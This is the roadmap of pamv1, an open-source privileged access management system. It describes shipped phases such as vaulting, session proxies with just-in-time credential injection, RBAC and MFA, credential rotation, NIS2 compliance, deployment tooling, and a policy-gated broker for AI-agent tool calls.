# pamv1 Roadmap

Guiding principle: **fully functional at every step**. Each phase ships something that runs end-to-end, passes tests, and deploys via IaC. Phases build on each other but stay independently releasable.

Status: ✅ done · 🚧 in progress · ⬜ planned

> 🟢 **Living document** — updated in the same change as the code, without a separate ask (see the [docs hub](docs/README.md)).

**Phases 0–188 are shipped.** Phases 96–108 are a refactor, security-hardening
and documentation-currency arc that sits on top of the feature work below:
cross-path security-parity fixes (96), observability parity (97), shared-helper
consolidation (98), store/API ergonomics (99), wiring readability (100), test
hygiene (101), the proxy-family structural unification behind one `admit()` gate
sequence (102), fuzzing the wire parsers (103), gosec enforcement + a
golangci-lint evaluation (104), config-validation test hardening (105), the
`IsZSP` cleanup (106), a documentation currency pass (107), and a fresh audit
sweep (108) that deduplicated a double-counted denial audit row, closed a
target/credential invariant gap, hardened three untested fail paths and two
doc-currency gaps, and deleted two functions dead since Phase 96/42. None of
96–108 changed user-facing behaviour, protocol, port or env var except 108's
two behavioral fixes (one denial now audits once instead of twice; a target
update that would strand a Zero Standing Privilege credential is refused).
**Phase 109 cuts that whole arc as v0.18.2**, so it stops banking unreleased,
and **Phase 110 makes SSH session recordings searchable by content** — the
first genuinely new capability since the 96–108 arc began, closing the
strongest finding from a fresh competitive-research pass against CyberArk and
Wallix — which **Phase 111 releases as v0.19.0** (a minor, since it is a real
feature, not a fix), and **Phase 112 closes that research pass's second
finding**: an interactive SSH session can require an actively-connected
supervisor before it proceeds, not just after-the-fact review — released in
turn as **v0.20.0 by Phase 113**, and **Phase 114 closes the pass's third
finding**: `GET /api/compliance/nis2` turns the doc-only Art. 21(2) control
matrix into a live, window-scoped report with real audit evidence per
control — released in turn as **v0.21.0 by Phase 115**. A fresh Wallix-weighted
research pass then closed its own strongest finding — **live session-sharing**
("Session Invite": view-only or view-control joining of a running session,
Phase 116) — released as **v0.22.0 by Phase 117**, and **Phase 118 closes that
pass's second finding**: CIDR/network-based connect & login authorization, a
per-user CIDR allowlist enforced at both the session-proxy `admit()` gate and
the REST `authz` middleware, break-glass exempt — released in turn as
**v0.23.0 by Phase 119**. **Phase 120 closes three more policy-richness
gaps** from the same Wallix-weighted plan: recurring access-request windows
(reusing the campaign scheduler's proven anchor-spawns-children shape),
configurable password-generation policy plus reuse-history enforcement, and
checkout-lease extension up to a configured ceiling — released in turn as
**v0.24.0 by Phase 121**. **Phase 122 closes the plan's one CyberArk-primary
finding**: suspending (freezing input on) a live SSH session without ending
it, reusing Phase 116's input mux directly rather than new plumbing — an
end-to-end test caught a real gate-placement race the unit tests alone
missed — released in turn as **v0.25.0 by Phase 123**. **Phase 124 closes the
plan's last open finding**: FIDO2/WebAuthn passwordless MFA, using a
well-audited library for the ceremony's cryptographic verification rather
than hand-rolling CBOR/COSE parsing — a deliberate departure from this
project's usual protocol-client posture, reasoned through explicitly in the
phase's own entry below — released in turn as **v0.26.0 by Phase 125**.
**Phase 126 closes the plan's sixth and final item** — portal color themes,
cosmetic rather than a vendor-parity finding, added to the plan after
approval on a direct user ask for a dark palette — completing the
Wallix-weighted plan's full run, released in turn as **v0.27.0 by Phase
127**. With that plan closed, **Phase 128 returns to the original
CyberArk/Wallix gap-research backlog's remaining item**: authenticated
post-login account discovery — a fixed, read-only enumeration command run
over a target's own vaulted credential (never the live interactive session),
parsed by a new pure `internal/accountscan` package and cross-referenced
against every credential pamv1 already vaults for that target, so a
login-capable account the host has but pamv1 doesn't track comes back
`"managed":false`, CyberArk DNA-style. **Phase 129 then extended Zero
Standing Privilege (Phase 22, SSH-only until now) to PostgreSQL**: a
`db_zsp` credential provisions a fresh, randomly-named role via the
target's separately vaulted provisioner credential and drops it when the
session ends, proven against a real Postgres wire-protocol exchange — with
two exclusions decided *before* writing code, not discovered after: RDP has
no equivalent (Guacamole's own documentation confirms no certificate-based
RDP auth parameter exists), and SQL Server is deferred (`internal/tds` has
no client-side response-token reader yet), released in turn as **v0.28.0 by
Phase 130** (bundled with Phase 128, since both banked unreleased while the
new 15-phase batch was being researched and planned). The narrative that follows traces the
feature arc through Phase 43 — the CyberArk/Wallix-style console, the AI-agent
access broker (MCP + SPIFFE), SOPS-encrypted secrets, the four **Tier-1
competitive-coverage gaps** closed (a PostgreSQL session proxy, supervised sessions
with command control, safes, dependent-account propagation), optional CyberArk Conjur
secret sourcing, the three **Tier-2** access-governance gaps closed
(certification campaigns, an ITSM/ticketing gate, richer approval workflows),
the two **Tier-3** market-frontier gaps that can be built and verified honestly in
process — **Zero Standing Privilege** (ephemeral short-lived SSH certificates, Phase 22)
and **privileged threat analytics** (behavioral risk scoring + automated response,
Phase 23) — the first **Tier-4** ecosystem gap: a **Conjur-style
application-secrets API** for non-agent apps (Phase 24), **console parity**
(Phase 25) — 5250 screens for every backend capability that had been API-only
(safes, certification campaigns, risk analytics, a live session viewer, and the
Phase 20/21 request-workflow fields), **session-recording playback +
one-time access** (Phase 26): audited, hash-verified replay of stored session
recordings from the portal, and single-use approvals consumed by the first
connection they admit — and **AI-agent broker completion** (Phase 27): approver-group
separation of duties, periodic ed25519 in-chain audit checkpoints with signing-key
rotation + JWKS and a truncation floor, OCSF SIEM export, and the MCP SSE transport
with elicitation, bringing the broker to parity with the [pam-research](https://github.com/morandeirachema/pam-research)
prototype — **operator SSH certificates** (Phase 28): proof-of-possession issuance of a
short-lived, principal-scoped cert for an operator's own key with KRL revocation — and a
**third-party vendor access gate** (Phase 29): time-boxed, customer-approved contract
grants with live employment attestation, an instant-offboard cascade, and per-vendor
evidence export — and **in-session policy + step-up** (Phase 30): numeric policy
comparators for the agent broker, and a pause-for-supervisor step-up on the
PostgreSQL session proxy that keeps the session open — the **identity blast-radius /
CIEM engine** (Phase 31), **SFTP file-transfer control** (32) and **RDP clipboard
control** (33) closing the two unaudited data-movement paths, the **HA kill-switch**
(34), **audit→SIEM push forwarding** (35), **retention / pruning** (36), and a
**gap-analysis pass** (37): child-resource deletes scoped to their parent, and failed
bearer credentials throttled + audited on every authentication surface — and
**command control on every command path** (38): the deny policy moved to
`internal/cmdguard` and is now enforced on the REST WinRM endpoint and the agent
broker's exec tools, not only inside the session proxies — and **the approver
capability on the two decision points** (39): releasing a paused statement and
certifying access are now `CapApprove`, not a read-only or user-admin gate — and
**every brokered execution is a supervised session** (40): the REST WinRM endpoint
and the agent broker's exec tools join the proxies in the live-session registry, so
they are listable, countable and killable — and **session recordings are encrypted
at rest** (41): the other high-value artifact finally gets the same envelope
encryption and KEK as the credentials themselves — and **shared custody of the host
and CA keys** (42), so a scaled deployment stops handing out a different SSH host key
and a different certificate authority per pod — and the console's **two human
decision points** (43): approving an agent's parked tool call, and releasing or
refusing a paused statement, both of which had been curl-only. The portal is
also **keyboard-first** (mouse optional).

**Phases 44–52g are deliberately not enumerated here** — the sentence above is
already too long, and its length is precisely why it spent nine phases out of
date. In summary: 44–51 hardened the console, the audit trail and the recording
pipeline; **52 through 52g** closed the thirty findings of the
[post-beta security sweep](#the-post-beta-sweep-2026-07-27--all-thirty-findings-closed-)
and the six more that reviewing those fixes uncovered. Each phase has its own
section below, which is the authoritative record.

Beyond those,
a number of items genuinely require external infrastructure or a paid account to build
and verify honestly, so they are left as documented follow-ons rather than faked. The
full catalogue is in **[docs/EXTERNAL-INFRA-GAPS.md](docs/EXTERNAL-INFRA-GAPS.md)**;
the headline deferrals are:

- **Optional Kerberos bind** (Phase 3b) — needs a KDC.
- **Kerberos WinRM auth** (Phase 4) — needs a KDC + an AD-joined host.
- **Serial (RS-232 / terminal-server) connectors** (Phase 8) — needs serial hardware.
- **The remaining three Tier-3 gaps** — connector/plugin breadth, cloud CIEM, and web/SaaS session proxying — each need a real device, cloud account, or browser/SaaS console to build honestly.

---

## Phase 0 — Project foundation ✅

- [x] Public open-source repo ([github.com/morandeirachema/pamv1](https://github.com/morandeirachema/pamv1)), Apache-2.0 license
- [x] Go module, standard layout (`cmd/`, `internal/`), CI on GitHub Actions (fmt, vet, build, race tests, Docker build)

## Phase 1 — Core: vault, inventory, audit, portal ✅

- [x] **Hardened vault**: AES-256-GCM, random nonce per secret, AAD binding to owning target, versioned token format (`v1:`) ready for key rotation
- [x] **Target inventory**: Linux/Windows machines (ssh / winrm / rdp) via REST API
- [x] **Credential store**: secrets encrypted before touching the DB; JSON encoder can never leak them; audited `reveal` as the temporary escape hatch
- [x] **Audit trail**: append-only events for every sensitive action
- [x] **Break-glass v1**: sealed emergency key (only its SHA-256 in config), loud `break-glass` actor, every use audited + logged
- [x] **Portal**: AS/400 / 5250-style terminal UI (Sign On, Work-with screens, F-keys) — deliberately austere so admins feel the gravity of the system
- [x] **Storage**: PostgreSQL (pgx) with embedded idempotent schema; in-memory store for tests/demo
- [x] **Deploy as IaC**: Dockerfile (distroless, non-root), docker-compose with hardened Postgres (scram-sha-256), K8s manifests (restricted PSS), Terraform module

## Phase 2 — Session proxy with JIT credential injection (Linux/SSH) ✅

The flagship: users connect *through* pamv1, never holding the credential.

- [x] SSH gateway (`golang.org/x/crypto/ssh`): user opens `ssh user@target@pam-proxy`, proxy authenticates the user, pulls the credential from the vault and injects it **just-in-time** into the upstream connection
- [x] Session recording (asciicast v2) stored with a SHA-256 written to the audit trail (tamper evidence)
- [x] Per-session audit events (start, record, end, denied, error)
- [x] **Per-target authorization** (`target_grants`): a target with grants only admits matching users/roles (admins always; ungranted targets stay open); enforced in the proxy, WinRM and RDP; managed via `/api/targets/{id}/grants`
- [x] **Live session listing and kill-switch** (`internal/session`): `GET /api/sessions` (auditor+) lists active proxy/RDP sessions; `DELETE /api/sessions/{id}` (admin) terminates one
- [x] **Hash-chain the recordings**: each recording's chain hash = SHA-256(prev-chain-hash ‖ file-hash), head persisted; recorded in the `session.record` audit (`chain:`)
- [x] Disable `reveal` by policy (`PAM_REVEAL_DISABLED`): reveal becomes break-glass-only, forcing the recorded proxy path

## Phase 3 — Identity & access control ✅

### 3a — RBAC with four profiles ✅

- [x] Four roles — **admin**, **user**, **auditor**, **approver** — with an authoritative role→capability matrix (`internal/auth`)
- [x] Per-user access tokens (stored as SHA-256 only), minted by an admin via `POST /api/users`
- [x] Enforcement in the REST API (per-route capability) and the SSH proxy (`CapConnect`); every denial audited (`authz.denied` / `session.denied`)
- [x] Audit now attributes real usernames; portal tolerates per-role 403s
- [x] `approver`'s approval endpoints (access-request workflow) — **shipped in Phase 8** (`/api/access-requests`, 4-eyes)

### 3b — Active Directory connector ✅

- [x] LDAP/LDAPS bind against AD ([go-ldap](https://github.com/go-ldap/ldap)): service-account search + user bind to verify the password
- [x] AD groups → the four pamv1 roles, via `PAM_LDAP_GROUP_*`; a user in several mapped groups carries **all** of them (`Principal.Roles`) and is granted the **union** of their capabilities — not just the single highest role — persisted across a session as `sessions.roles` (same for Entra app-roles/groups)
- [x] Portal Sign On with AD username + password; short-lived **session tokens** (`POST /api/login`, `POST /api/logout`) that work in the portal and the SSH proxy
- [x] **MFA: TOTP** (RFC 6238) enrollment + verification (`internal/mfa`), secret stored vault-encrypted, enforced on `/api/login`; self-service `/api/mfa/*` (NIS2 Art. 21(2)(j))
- [x] **Microsoft Entra ID (Azure AD)** login: OAuth2 (ROPC) against the tenant, Entra app roles / groups → the four roles; composable with LDAP via a chain authenticator; sovereign-cloud authority host
- [x] **Enforce-MFA policy** (`PAM_MFA_REQUIRED`) with enrollment-only sessions, and **single-use recovery codes**
- [x] **OIDC Authorization Code flow + PKCE + JWKS signature validation** (`internal/oidc`): browser SSO (`/api/auth/oidc/{start,callback}`), IdP-side MFA/Conditional Access, ID-token verified (RS256, iss/aud/nonce/exp), discovery
- [ ] Optional Kerberos bind (needs a KDC to test)
- [x] Entra ROPC **id_token JWKS signature validation** — requests `openid`, validates the id_token's RS256 signature against the tenant JWKS (`oidc.VerifyRS256`) + audience + expiry before trusting role/group claims
- [x] OIDC pending-state shared store for multi-replica HA — **shipped in Phase 10** (`store.PutOIDCState`/`TakeOIDCState`, migration `0004`)
- [x] Local emergency admin kept for AD-down scenarios (bootstrap key + break-glass)

## Phase 4 — Windows targets ✅

- [x] **WinRM command execution with JIT credentials** (`internal/winrm`): `POST /api/targets/{id}/winrm` decrypts the target's credential only at run time, executes over WinRM, records the transcript (SHA-256 in the audit), returns stdout/stderr/exit — the caller never sees the secret
- [x] AD-joined target support: uses domain service accounts stored in the vault (the credential username may be `DOMAIN\\user` or UPN)
- [x] **NTLM WinRM auth** (`PAM_WINRM_AUTH=ntlm`) — NTLMv2 transport, which AD-joined hosts usually require
- [x] **RDP brokering via Apache Guacamole `guacd`** (`internal/guacd` + `GET /api/targets/{id}/rdp` WebSocket tunnel): the credential is injected just-in-time into the guacd handshake — it reaches guacd, never the browser (`PAM_GUACD_ADDR`). **guacd itself now ships** in the Docker/K8s/Helm deploys (internal-only)
- [x] **Browser RDP viewer**: the portal vendors guacamole-common-js and renders the desktop on a canvas (*Work with Targets* option 7; `Ctrl+Alt+Q` to disconnect), fronted by a short-lived `POST /api/rdp-token`. Verified by a full WebSocket round-trip test against a fake guacd — only the *rendered pixels* still need a real Windows host (see [docs/RDP-TESTING.md](docs/RDP-TESTING.md))
- [x] guacd server-side session recording for RDP (`PAM_GUACD_RECORDING_PATH`; recording name in the `rdp.connect` audit)
- [ ] Kerberos WinRM auth — **infra-bound**: needs a KDC + an AD-joined Windows host to verify
- [x] **Interactive WinRM shell through the SSH proxy** (`PAM_PROXY_WINRM`): `ssh <cred>@<winrm-target>@pam` opens a command loop — each line runs as a WinRM command (JIT credential), output streams back and is recorded. (A command loop, not a stateful PowerShell — working directory/variables don't persist across lines; a WinRS streaming shell is a follow-on needing a real host to verify.)

## Phase 5 — Hardening: database, vault, transport ✅

- [x] **Envelope encryption** with a pluggable KEK: per-secret data keys wrapped by a Key Encryption Key; `local` KEK (dev/test) + **HashiCorp Vault Transit** KEK (production, KEK never leaves the KMS)
- [x] **Vault key rotation** (`pam-server -rotate-kek`, `internal/maint`): re-encrypts all credentials + MFA secrets from `PAM_MASTER_KEY` to `PAM_NEW_MASTER_KEY`, preserving AAD
- [x] Hardened Postgres guidance: scram-sha-256 enforced (compose), TLS `verify-full` + least-privilege role + [pgAudit](https://www.pgaudit.org/) documented
- [x] **Versioned migrations** (embedded, `schema_migrations` table, ordered `migrations/*.sql` applied in a transaction) replacing the ad-hoc startup schema
- [x] **Native HTTPS** (`PAM_TLS_CERT`/`PAM_TLS_KEY`, TLS 1.2+), **security headers** (nosniff, frame-deny, referrer, HSTS), **rate limiting** on auth endpoints (`PAM_AUTH_RATE_LIMIT`)
- [x] **Backup/restore runbook** with encrypted backups ([docs](docs/BACKUP-AND-RESTORE.md))
- [x] **Upstream SSH host-key pinning** (`PAM_SSH_KNOWN_HOSTS`, [known_hosts](https://pkg.go.dev/golang.org/x/crypto/ssh/knownhosts)): the JIT proxy and the rotation connector verify target host keys instead of trusting any; unconfigured falls back to trust-any with a loud warning
- [x] **AWS KMS KEK** (`aws-kms` provider): the data key is wrapped/unwrapped by KMS (`PAM_KEK_AWS_KEY_ID`/`PAM_KEK_AWS_REGION`); the CMK never leaves KMS
- [x] _(optional extension)_ **PKCS#11 HSM KEK provider** — `vault/pkcs11.go` behind the `pkcs11` build tag (cgo), `deploy/docker/Dockerfile.pkcs11`, `PAM_KEK_PKCS11_*`; the AES wrapping key stays in the HSM. Verified against SoftHSM2 in CI; the default static image is unchanged (a stub returns "not built in")

## Phase 6 — Break-glass v2 ✅

- [x] **M-of-N quorum unseal** ([Shamir secret sharing](internal/shamir), `pam-server -split-key`, `POST /api/breakglass/unseal`): custodians submit shares; when M reconstruct the key (verified against its hash) a session is issued
- [x] **Auto-expiring break-glass sessions** (short-TTL session, `PAM_BREAK_GLASS_TTL_MIN`, scope `breakglass` → admin + loud audit)
- [x] **Real-time alerting** (`internal/alert` webhook, `PAM_ALERT_WEBHOOK`) on every break-glass **access** and **unseal**
- [x] Documented offline procedure (sealed shares, dual control) — see the [Admin Guide](docs/ADMIN-GUIDE.md)
- [x] Forced credential rotation after break-glass use — a break-glass session that connects through the proxy triggers `PAM_ROTATE_AFTER_SESSION` on session end (a reveal-path break-glass rotation is a smaller follow-on)
- [x] **Additional alert channels (email + syslog)** on the same `Notifier` interface (`alert.Syslog`, `alert.Email`, `alert.Multi` fan-out; `PAM_ALERT_SYSLOG` / `PAM_ALERT_EMAIL_*`)

## Phase 7 — Credential lifecycle ✅

- [x] **Rotation connectors** ([`internal/rotate`](internal/rotate)): Linux over SSH (`chpasswd` via stdin — no shell injection), Windows over WinRM (`net user`). Strong password generation from a shell-safe alphabet with guaranteed complexity categories. **`ssh_key` rotation**: generates a fresh ed25519 keypair and replaces the account's `authorized_keys` (old key stops working)
- [x] **On-demand rotation**: `POST /api/credentials/{id}/rotate` generates a fresh secret, sets it on the target, then re-vaults it and stamps `rotated_at` — the new secret is never returned (proxy injects it JIT)
- [x] **Scheduled rotation**: background lifecycle worker (`PAM_ROTATE_INTERVAL_MIN`) rotates password credentials older than `PAM_ROTATE_MAX_AGE_HOURS`
- [x] **Account reconciliation (out-of-sync detection & remediation):**
  - [x] Credential reconciliation — `POST /api/credentials/{id}/reconcile` verifies the vaulted secret still authenticates to the target (SSH handshake / WinRM probe); drift is flagged and, with `?remediate=true`, remediated by rotating to a PAM-managed secret
  - [x] Reconciliation scan — `GET /api/reconcile` reports drift across all credentials (read-only, safe to schedule), fully audited (`credential.reconcile`, `credential.rotate`, `credential.remediate`)
- [x] **Credential checkout/check-in with lease** — `POST /api/credentials/{id}/checkout` grants an exclusive, time-boxed lease (`PAM_CHECKOUT_TTL_MIN`) and returns the secret; `/checkin` ends it and **rotates** the credential so the seen password is invalidated. Enforced single-holder; honors the reveal-disabled policy
- [x] **Discovery** — `POST /api/discovery/scan` probes hosts for reachable management ports (SSH/WinRM/RDP) and can auto-onboard new targets (`internal/discovery`, reachability only — no credentials used)
- [x] **Identity reconciliation**: `POST /api/identity/reconcile[?dry_run=true]` checks every local user against the directory (`auth.DirectorySource.UserStatus`), **revokes disabled directory users** (`user.revoked`) and surfaces absent local-only accounts as `not_in_directory` (never revoked on uncertainty)
- [x] **AD/LDAPS password-change primitive** (`LDAPAuthenticator.ChangePassword` — Modify `unicodePwd`, UTF-16LE/quoted; unit-tested). *(Wiring it into a full AD-account rotation flow and real-DC interop is a follow-on.)*
- [x] **Forced rotation after each proxied SSH session ends** (`PAM_ROTATE_AFTER_SESSION`): the proxy's `OnSessionEnd` hook calls `Server.RotateCredentialByID`, so a secret used in one session can't be reused in the next (covers break-glass proxied sessions too)

## Phase 8 — OT adaptation ✅

Designed for industrial environments ([IEC 62443](https://www.isa.org/standards-and-publications/isa-standards/isa-iec-62443-series-of-standards), Purdue model) — see the [OT Deployment Guide](docs/OT-DEPLOYMENT.md):

- [x] **Session approval workflow (4-eyes)**: `POST /api/access-requests` → approver (a *different* principal, `CapApprove`) approves/denies; `access_requests` table; enforced on **every** connect path (SSH proxy, WinRM, RDP); break-glass bypasses; approvals/denials audited + alerted. Per-target (`require_approval`) or global (`PAM_REQUIRE_APPROVAL`), time-boxed (`PAM_APPROVAL_WINDOW_MIN`)
- [x] **Air-gap/offline mode** (`PAM_OT_AIRGAP`): disables all outbound calls (alert webhooks); alerts still hit the audit trail + local logs
- [x] Deployment pattern for the industrial DMZ (level 3.5) documented (Purdue diagram, firewall guidance, IEC 62443 control mapping)
- [x] **Protocol allowlisting** (`PAM_ALLOWED_PROTOCOLS`): restrict which target protocols may be created/connected (e.g. forbid RDP in an OT zone); enforced at create-target and on every connect path (API + proxy)
- [x] **Read-only observer sessions**: `ssh <cred>@<target>+observe@pam` opens a view-only session — output streams and is recorded, but operator keystrokes are dropped and exec/subsystem requests are refused (`mode:observer` in the audit)
- [x] **Jump-host / bastion connector** (`PAM_SSH_JUMP_*`): reach SSH targets only accessible via an SSH bastion — the proxy tunnels a `direct-tcpip` channel through the jump host (public-key auth, per-dial bastion connection)
- [ ] Serial connectors (RS-232 / terminal servers) for legacy equipment — needs serial hardware (follow-on)

## Phase 9 — NIS2 compliance pack ✅

Mapping to [Directive (EU) 2022/2555](https://eur-lex.europa.eu/eli/dir/2022/2555/oj) — see the [NIS2 Compliance Pack](docs/NIS2-COMPLIANCE.md):

- [x] **Control matrix doc**: full Art. 21(2)(a–j) measure ↔ pamv1 feature mapping
- [x] **Incident reporting export** (Art. 23): `GET /api/audit/export` returns a scoped audit slice (`since`/`until`/`actor`/`action`, JSON or CSV) with a **SHA-256 tamper-evidence digest** (body field + `X-PAM-Export-SHA256` header); the export is itself audited
- [x] **Audit retention + SIEM forwarding** guidance (append-only trail in Postgres; JSON logs + audit events to stdout for a collector; real-time alert webhook)
- [x] **Risk-management documentation template** for essential/important entities

## Phase 10 — Scale & operations ✅

- [x] **Observability**: Prometheus `/metrics` (`internal/metrics`, dependency-free exposition — request counts by status, audit volume, break-glass use, rotations, active-sessions gauge), structured JSON logs, **health/readiness split** (`/healthz` liveness + `/readyz` store-reachability readiness, `store.Ping`)
- [x] **Helm chart** (`deploy/helm/pamv1`): deployment/service/secret/ingress/ServiceMonitor, configurable replicas, PVC or emptyDir, hardened pod security context
- [x] **Signed release pipeline** (`.github/workflows/release.yml`): build + push by digest on a version tag, **SBOM** (SPDX) generation + attestation, **cosign** keyless image signing, GitHub Release. First executed for real on 2026-07-28: **v0.10.0** published, signed and attested end to end
- [x] **HA — OIDC login state shared** via the store (migration `0004`, `store.PutOIDCState`/`TakeOIDCState`), so the auth-code callback can land on any replica. The auth rate-limiter stays best-effort per-replica; break-glass quorum-unseal keeps its shares in memory **by design** (persisting key shares to the DB would weaken the offline-shares guarantee — use a sticky session or a single replica for the unseal flow)
- [x] **Postgres HA** via [CloudNativePG](https://cloudnative-pg.io/): a 3-instance `Cluster` manifest (`deploy/k8s/postgres-cnpg.yaml`, automatic failover, scram-sha-256, optional PITR)
- [x] **Terraform module for cloud-managed Postgres** (`deploy/terraform/cloud-postgres/` — AWS RDS example: multi-AZ, encrypted, `force_ssl`)
- [x] **SLSA build provenance** attested by the release pipeline (exercised for the first time by the v0.10.0 tag on 2026-07-28) (`actions/attest-build-provenance` in `release.yml`, pushed to the registry alongside the cosign signature + SBOM)

## Phase 11 — Management console ✅

The AS/400 5250 green-terminal portal grows from 3 screens into a full
management console covering every backend capability (CyberArk/Wallix-grade
*coverage*, IBM 5250 *look*). Still one `//go:embed`'d page, vanilla JS,
nonce-CSP, no build step — the retro aesthetic is a deliberate constraint, not a
limitation.

- [x] **Role-aware menu** — `GET /api/me` returns the caller's identity + the stable capability names its role holds; the main menu shows only the options the role may use (panels still tolerate a 403 as a backstop)
- [x] **Targets** — subfile with delete + *work-with-grants*, `require_approval` on add; **target grants** screen (list/add/delete role- or user-scoped access)
- [x] **Credentials** — reveal (audited), **check-out** (leased secret + expiry), rotate, reconcile, delete
- [x] **Check-out / check-in** — active exclusive leases; check-in rotates the secret
- [x] **Active sessions** — live monitor (auto-refresh) of proxied SSH/WinRM/RDP sessions with a kill switch
- [x] **Access requests** — 4-eyes: approvers see pending requests and approve/deny; connect-capable users file requests
- [x] **Users & roles** — mint one-time tokens, delete, run directory reconciliation
- [x] **MFA self-service** — enroll (secret + otpauth), confirm, recovery codes, disable
- [x] **Discovery** — scan hosts for reachable SSH/WinRM/RDP and optionally onboard as targets
- [x] **Reconciliation report** — read-only drift scan across all credentials
- [x] **Audit trail** — client-side filter + tamper-evident CSV export (SHA-256)
- [x] **Break-glass unseal** — submit an M-of-N quorum share; on quorum an audited, auto-expiring admin session is issued

## Phase 12 — Configuration subsystem & custom profiles ✅

Make identity backends, policies, and permission profiles configurable from the
console — the CyberArk/Wallix administration surface — using a **hybrid** model
that respects the project's IaC-first roots.

- [x] **Hybrid config model**: directory bindings (LDAP/AD, **Kerberos**), SSO (Entra/OIDC), and policies become editable settings **persisted in the DB** and applied on save; the authenticator chain is rebuilt from stored config — *shipped*: the DB-persisted, vault-encrypted settings store + `GET/PUT/DELETE /api/config` overlaid onto the env config, **plus hot-swap without a restart** (an atomic `runtimeConf` snapshot rebuilt by a `Reconfigure` closure, with rollback on a rejected change; bootstrap/transport/listeners stay env-only and restart-bound)
- [x] **Networking/TLS stays IaC**: a read-only effective-config + backend-health screen (`GET /api/config/effective`) plus a generator (`GET /api/config/iac?format=env|helm|terraform`) that exports the console-set overrides back to IaC, secrets rendered as secret-store placeholders (never plaintext); listeners/ports/TLS stay env-only
- [x] **Custom permission profiles**: named capability sets assignable to users (a configurable RBAC engine), with the current 4 roles as built-in defaults; assignment surfaced in *Work with users & profiles* — *shipped*: `profiles` table (migration `0009`), `POST/GET /api/profiles` + `DELETE /api/profiles/{id}`, `auth.Principal.Can` resolving a capability set (built-in roles unchanged), `createUser` accepting a profile name, and the console role/profile picker now loading custom profiles live
- [x] Console screens (5250 style) to manage profiles (menu 12), identity/SSO/policy configuration (menu 13), and effective config + backend health with IaC export (menu 14); Kerberos *config* is expressible via the generic `PAM_*` override editor even though live Kerberos auth needs a KDC to exercise (see the infra-bound list above)

## Phase 13 — AI-agent access broker ✅

PAM for AI agents (ports [`morandeirachema/pam-research`](https://github.com/morandeirachema/pam-research)): an agent holds only an identity key; a policy engine decides `allow / require_approval / deny` on a tool call **and its arguments**; approved actions execute **server-side** with a just-in-time credential; the agent receives only the result. "Trust the chokepoint, not the agent." Opt-in via `PAM_BROKER_POLICY_FILE`; brokers pamv1's own operations with JIT vault injection.

- [x] **Policy engine** (`internal/policy`): YAML rules (`eq`/`not`/`in`/`not_in`; numeric comparators in Phase 30, `present` in Phase 163, where every operator also became presence-requiring), first-match-wins, implicit deny, scope templating, fail-loud loader
- [x] **Agent identity** (`internal/agentid`): static bearer keys (`agent_keys`, SHA-256 hash lookup), `RoleAgent` + `CapCallTool`
- [x] **Tool registry + JIT execution**: `winrm_exec` over the refactored `execWinRM` — decrypts just-in-time, returns only the result (proven: the runner gets the vaulted secret, the response leaks nothing)
- [x] **Verifiable audit chain** (`internal/auditchain`): keyed-HMAC per-event hash chain (`broker_audit_events`) + `/v1/audit/verify` + ed25519-signed head checkpoint for truncation detection
- [x] **REST surface**: `POST /v1/tool-calls`, `GET /v1/tool-calls/{id}`, `POST /v1/agents`, `GET /v1/audit[/verify|/head]`; HTTP-200-with-status error model
- [x] **Approval + resume + short-lived single-use tokens + more tools**: the `require_approval` effect parks a call, an approver decides via `GET /v1/approvals` + `POST /v1/approvals/{id}/decision`, execute-on-approve injects JIT (the human decision satisfies the target four-eyes gate), and the agent collects the result once with a single-use `broker_tokens` JTI (`POST /v1/tool-calls/{id}/resume`); per-agent rate limits + argument-size caps. Tools: `winrm_exec`, `ssh_exec`, `list_targets`, `list_credentials`, `rotate_credential`, and `reveal_credential` (default-deny)
- [x] **MCP server** (`internal/mcp`): hand-rolled JSON-RPC 2.0 at `POST /mcp` (`initialize`, `tools/list`, `tools/call`, `ping`, `broker/resume`) behind the same agent auth and sharing the one `broker.ProcessCall`/`Resume` loop — proven at parity with REST (same policy, JIT injection, single-use resume, audit)
- [x] **SPIFFE JWT-SVID + RFC 8693 delegation**: `agentid.SVIDVerifier` validates JWT-SVIDs against a file trust-domain JWKS (RS256/ES256/EdDSA), enforcing SPIFFE subject + audience + expiry (fail-closed), with nested `act` claims capped by `PAM_BROKER_MAX_DELEGATION_DEPTH`; a `MultiVerifier` accepts SVIDs alongside static keys (reuses the `internal/oidc` JWT/JWKS approach, no new dependency)
- [x] **Post-review hardening**: a parked `require_approval` call is **re-validated at decision time** (`broker.WithRevalidator`) — an agent key revoked/disabled, or an SVID expired, since parking is refused rather than executed on approval; broker-audit append is serialized across processes under a **Postgres advisory lock** (`AppendBrokerAuditLinked`, the migration-lock idiom) so a rolling-deploy pod overlap or an HA replica can't fork the keyed-HMAC chain; numeric policy arguments match in plain decimal (no `1e+07` mismatch)
- Deferred (documented): SPIRE workload attestation, RFC 8693 token-**exchange** minting *(shipped in Phase 57 — it needed no external STS)*, MCP SSE/elicitation, KEK-wrapping the audit keys

## Phase 14 — SOPS-encrypted secrets ✅

Keep the Kubernetes secret manifest **in the IaC repo** without leaking it: encrypt the
values with [SOPS](https://github.com/getsops/sops) + [age](https://age-encryption.org/) so
`kind`/`metadata`/keys stay reviewable while `PAM_MASTER_KEY`, `PAM_API_KEY` and the database
URL are sealed to a key only operators (or a KMS/HSM) hold.

- [x] **SOPS creation rules** (`deploy/.sops.yaml`): `encrypted_regex` seals only `data`/`stringData` values of any `deploy/k8s/sops/secrets*.yaml`; age recipient (KMS/PGP recipients documented for cloud/multi-custodian setups)
- [x] **Reproducible encrypted example**: `deploy/k8s/sops/secrets.sops.example.yaml` is a real SOPS-sealed Secret decryptable with a committed **throwaway demo key** (`age-example.key`, loudly marked demo-only) so the whole flow can be run and studied
- [x] **Deploy flow**: `apply.sh` streams `sops --decrypt | kubectl apply -f -` (plaintext never touches disk); `.gitignore` blocks real keys and non-example sealed files; docs cover Flux / Argo / helm-secrets GitOps
- [x] **CI gate**: a `sops` job installs sops+age and runs `verify.sh` — proving the example is encrypted (no accidental plaintext commit) and round-trips
- Deferred (documented): cloud-KMS recipients wired into the Helm chart, a Flux `Kustomization` example, and sealing the CloudNativePG app-secret

## Phase 15 — Database session proxy (PostgreSQL) ✅

Extend the JIT chokepoint to **databases** — the first of the [Tier-1 competitive-coverage gaps](README.md#coverage-vs-commercial-pam-cyberark-wallix-) (matching [Teleport](https://goteleport.com/docs/enroll-resources/database-access/) / [StrongDM](https://www.strongdm.com/) / CyberArk DPA). An operator points `psql` at pamv1; the proxy authenticates them, injects the vaulted DB credential just-in-time, and brokers the wire protocol — auditing every SQL statement. The operator never sees the database password. Opt-in via `PAM_DB_ADDR`.

